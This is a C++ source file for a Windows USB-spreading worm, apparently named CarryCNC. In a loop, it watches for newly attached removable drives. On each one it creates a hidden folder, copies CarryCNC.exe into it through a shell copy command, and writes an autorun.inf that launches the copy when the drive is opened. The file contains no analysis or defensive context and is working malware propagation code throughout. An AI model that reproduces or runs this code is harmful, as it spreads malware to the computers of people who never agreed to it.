#include "ThreadInfection.h"

void *InfectionProc(void *param)
{
	char tempdrives[MAX_PATH], tempdrives1[MAX_PATH];
	DWORD length = GetLogicalDriveStrings(MAX_PATH, tempdrives);
	vector <string> Drives = DisplayDrives(false);
	string command;
	InfectCopy(Drives, command);
	Drives.clear();

	while (true)
	{
		Sleep(1);
		if (length != GetLogicalDriveStrings(MAX_PATH, tempdrives1))
		{
			length = GetLogicalDriveStrings(MAX_PATH, tempdrives);
			Drives = DisplayDrives(false);
			InfectCopy(Drives, command);
		}
		Drives.clear();
	}

	return NULL;
}
vector <string> DisplayDrives(bool print)
{
	char szLogicalDrives[MAX_PATH];
	vector <string> DrivesTom;
	DWORD len = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

	if (len > 0 && len <= MAX_PATH)
	{
		char *szSingleDrive = szLogicalDrives;
		while (*szSingleDrive)
		{
			if (GetDriveType(szSingleDrive) == DRIVE_REMOVABLE)
				DrivesTom.push_back(szSingleDrive);

			szSingleDrive += strlen(szSingleDrive) + 1;
		}
	}

	if (print)
	{
		vector <string>::iterator vit;
		string::iterator sit;
		if (DrivesTom.size() == 0)
		{
			cout << "No device avaliable" << endl;
			return DrivesTom;
		}
		for (vit = DrivesTom.begin(); vit != DrivesTom.end(); vit++)
		{
			for (sit = vit->begin(); sit != vit->end(); sit++)
				cout << *sit;
			cout << endl;
		}
	}

	return DrivesTom;
}
void InfectCopy(vector <string> &Drives, string &command)
{
	if (Drives.size() != 0)
	{
		for (int i = 0; i < Drives.size(); i++)
		{
			command = Drives[i] + virusfolder;
			if (!DirectoryExists(command.c_str()))
			{
				_mkdir(command.c_str());
				HideFile(command.c_str());
				string cmdc; cmdc = "copy /b CarryCNC.exe " + command; 
				system(cmdc.c_str());

				ofstream out;
				out.open(Drives[i] + "autorun.inf", ios::out);
				out << "[autorun]\nopen = "; out << virusfolder; out << "\\"; out << spycarry;
				out.close();
			}
			command.clear();
		}
	}
}